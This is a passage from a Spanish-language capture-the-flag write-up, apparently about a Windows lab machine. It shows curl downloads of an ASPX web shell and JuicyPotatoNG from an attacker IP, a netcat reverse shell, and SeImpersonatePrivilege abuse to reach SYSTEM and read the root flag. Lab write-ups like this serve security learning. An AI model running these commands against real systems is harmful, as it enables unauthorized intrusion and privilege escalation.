+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\inetpub\development> </span><span class="no">curl 10.10.14.10/cmd.aspx -o cmd.aspx
+</span><span class="p">PS C:\inetpub\development></span>
+</code></pre></div></div>
+
+<div><p>Miramos el archivo aspx en el navegador y podemos ejecutar comandos</p></div>
+<div><p><img src="./8.png"><p></div>
+
+<div><p>Ahora simplemente nos enviamos una reverse shell con el netcat</p></div>
+<div><p><img src="./9.png"><p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.187
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\windows\system32\inetsrv> </span><span class="no">whoami</span><span class="p">
+iis apppool\defaultapppool
+PS C:\windows\system32\inetsrv></span>
+</code></pre></div></div>
+
+<div><p>En los privilegios del usuario podemos encontrar el famoso SeImpersonatePrivilege</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\windows\system32\inetsrv> </span><span class="no">whoami /priv</span><span class="p">
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+</span><span class="kd">SeImpersonatePrivilege</span><span class="p">        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+PS C:\windows\system32\inetsrv></span>
+</code></pre></div></div>
+
+<div><p>Descargamos el <a href="https://github.com/antonioCoco/JuicyPotatoNG">JuicyPotatoNG</a> de nuestra máquina y ejecutamos el exe, podemos decirle que nos otorgue una cmd y entrar en modo interactivo, ahora somos nt authority\system</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Gato> </span><span class="no">curl 10.10.14.10/JuicyPotatoNG.exe -o JP.exe</span><span class="p">
+PS C:\Gato> </span><span class="no">.\JP.exe -t * -p "C:\Windows\System32\cmd.exe" -i</span><span class="p">
+
+         JuicyPotatoNG
+         by decoder_it & splinter_code
+
+[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51}
+[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51}
+[+] CreateProcessAsUser OK
+[*] Process output:
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\> </span><span class="no">whoami</span><span class="p">
+nt authority\system
+
+C:\> </span><span class="no">type C:\Users\Administrator\Desktop\root.txt</span><span class="p">
+ac2**************************f8e 
+
+C:\></span>
+</code></pre></div></div>
+
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
